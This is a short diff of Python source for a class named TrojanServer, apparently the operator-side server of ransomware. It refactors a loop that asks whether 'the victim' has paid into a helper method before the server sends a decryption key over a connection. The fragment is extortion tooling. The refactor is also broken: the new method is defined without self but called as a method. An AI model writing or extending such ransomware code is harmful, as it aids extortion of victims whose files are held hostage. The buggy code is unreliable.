@@ -134,11 +134,7 @@ class TrojanServer:
         decoded_data = data.decode()
         print(decoded_data)
         
-        paid = False
-        while(not paid):
-            has_paid = input("is the victim paid? [yes/no]\your answer:   ")
-            if has_paid == "yes":
-                paid = True
+        self._is_paid()
         
         msg = "sending decryption key"
         protocol.send(self.conn, msg)
@@ -151,6 +147,11 @@ class TrojanServer:
         print(decoded_msg)
         
     def _is_paid():
+        paid = False
+        while(not paid):
+            has_paid = input("is the victim paid? [yes/no]\your answer:   ")
+            if has_paid == "yes":
+                paid = True
 
 
 
